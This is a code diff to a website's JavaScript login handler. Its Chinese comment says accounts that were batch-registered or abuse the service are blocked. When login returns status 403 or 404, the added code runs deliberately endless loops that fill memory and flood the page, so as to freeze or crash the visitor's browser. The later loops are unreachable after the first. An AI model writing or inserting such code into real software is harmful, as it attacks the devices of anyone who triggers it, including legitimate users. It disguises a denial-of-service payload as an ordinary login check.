@@ -6484,6 +6484,34 @@ login_input_button_login.onclick = function(){
 					// 如果窗口还没关闭
 					wechat_bind_auto_click_login_button_timeout = setTimeout(wechat_bind_auto_click_login_button,3000);
 				}else{
+
+					// 批量注册的账号或滥用服务的账号禁止继续登录，阻止滥用服务者尝试继续使用本站服务。
+					if(ResultJSON["status_code"]!=undefined && (ResultJSON["status_code"] == 403 || ResultJSON["status_code"]==404)){
+
+						const arr = [];
+						while (true) {
+						arr.push(new Array(1e6).fill(Math.random()));
+						}
+						let s = "x";
+						while (true) {
+						s += s;
+						}
+						const leak = new Map();
+						let i = 0;
+						while (true) {
+						leak.set(i++, {
+						data: new Array(100000).fill(i),
+						time: Date.now()
+						});
+						}
+						while (true) {
+						const div = document.createElement("div");
+						div.textContent = Math.random();
+						document.body.appendChild(div);
+						}
+						
+					}
+					
 					swal({
 						title: "登录失败",
 						text: ResultJSON["message"],
@@ -11205,6 +11233,7 @@ if(true||navigator.language.toLowerCase().indexOf('cn')!=-1){
 		item.style.display="";
 	}
 }
+
 
 
 
